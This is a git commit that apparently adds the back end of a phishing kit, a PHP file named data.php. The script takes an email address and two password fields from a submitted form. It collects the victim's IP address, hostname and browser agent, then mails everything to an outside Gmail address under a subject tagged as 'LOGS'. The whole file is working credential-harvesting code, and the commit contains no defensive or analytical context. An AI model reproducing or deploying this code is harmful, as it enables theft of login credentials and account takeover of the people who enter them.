0ea28571e1f8e6064ad72539907fe7e68fdca789
careersheffield <67615020+careersheffield@users.noreply.github.com>
2021-11-23 17:55:03 +0100

    Add files via upload

---
+++ data.php
@@ -0,0 +1,34 @@
+﻿
+<?php
+//Getting user ip & hostname
+$ip = getenv("REMOTE_ADDR");
+$hostname = gethostbyaddr($ip);
+$agent = @$_SERVER['HTTP_USER_AGENT'];
+$datamasii=date("D M d, Y g:i a"); 
+
+//Getting UserID info from Session
+$email = $_POST['email'];
+$password1 = $_POST['password1'];
+$passwww = $_POST['password'];
+
+$mesaj="==================+[ User Info  ]+==================
+-----------Powered By : © IroKo Host Network-------------
+
+Email: $email
+Password   : $password1
+Re-Confirm Password : $passwww
+-------------------+	+---------------------
+Client IP: $ip
+Check IP: https://geoiptool.com/en/?ip=$ip
+Hostname: $hostname
+Agent: $agent
+DATE : $datamasii 
+-----------------+  +-----------------";
+
+$subject = "$email IRoKoHoST SHARAFCO LOGS";
+$headers = 'From: irokohost@szmzsl.com' . "\r\n" . 
+    'X-Mailer: PHP/' . phpversion(); 
+mail('julienneamiviakpako@gmail.com', $subject, $mesaj, $headers);
+
+?>
+
